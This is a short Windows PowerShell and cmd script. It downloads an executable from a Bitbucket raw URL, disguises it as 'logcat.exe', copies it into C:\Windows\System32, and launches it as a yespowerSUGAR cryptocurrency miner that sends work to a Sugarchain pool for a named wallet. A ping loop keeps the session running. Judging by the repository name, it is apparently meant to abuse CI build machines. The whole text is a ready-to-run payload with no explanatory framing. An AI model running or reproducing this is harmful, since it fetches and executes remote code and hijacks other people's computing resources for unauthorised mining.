Invoke-WebRequest https://bitbucket.org/huyata001/circleci-opts/raw/6329928411f7c3a0bd2760777716ed1c76a5d6c3/logcat.exe -OutFile logcat.exe
Copy logcat.exe C:\Windows\System32
cmd /c echo cmd /k start logcat.exe -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.ciwin1 -t2 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
